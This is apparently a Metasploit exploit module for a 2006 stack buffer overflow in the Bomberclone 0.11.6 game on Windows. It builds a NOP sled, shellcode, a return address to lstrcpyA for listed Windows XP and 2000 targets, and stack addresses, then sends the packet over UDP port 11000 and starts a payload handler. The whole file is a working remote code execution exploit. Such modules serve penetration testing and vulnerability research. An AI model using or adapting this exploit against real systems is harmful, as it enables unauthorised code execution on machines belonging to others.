##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = AverageRanking

  include Msf::Exploit::Remote::Udp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Bomberclone 0.11.6 Buffer Overflow',
      'Description'    => %q{
          This module exploits a stack buffer overflow in Bomberclone 0.11.6 for Windows.
        The return address is overwritten with lstrcpyA memory address,
        the second and third value are the destination buffer,
        the fourth value is the source address of our buffer in the stack.
        This exploit is like a return in libc.

        ATTENTION
        The shellcode is exec ONLY when someone try to close bomberclone.
      },
      'Author'         => 'Jacopo Cervini <acaro[at]jervus.it>',
      'References'     =>
        [
          ['CVE', '2006-0460'],
          ['OSVDB', '23263'],
          ['BID', '16697']
        ],
      'Payload'        =>
        {
          'Space'    => 344,
          'BadChars' => "\x00"
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          ['Windows XP SP2 Italian',   { 'Ret' => 0x7c80c729, } ], # kernel32!lstrcpyA
          ['Windows 2000 SP1 English', { 'Ret' => 0x77e85f08, } ], # kernel32!lstrcpyA
          ['Windows 2000 SP1 English', { 'Ret' => 0x77e95e8b, } ], # kernel32!lstrcpyA
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Feb 16 2006'
      ))

    register_options([ Opt::RPORT(11000) ])
  end

  def exploit
    connect_udp

    pattern  = make_nops(421)
    pattern << payload.encoded
    pattern << [ target.ret ].pack('V')
    pattern << "\x04\xec\xfd\x7f" * 2
    pattern << "\xa4\xfa\x22\x00"

    request  = "\x00\x00\x00\x00\x38\x03\x41" + pattern + "\r\n"

    print_status("Trying #{target.name} using lstrcpyA address at #{"0x%.8x" % target.ret }...")

    udp_sock.put(request)
    udp_sock.get(5)

    handler(udp_sock)
    disconnect_udp
  end
end
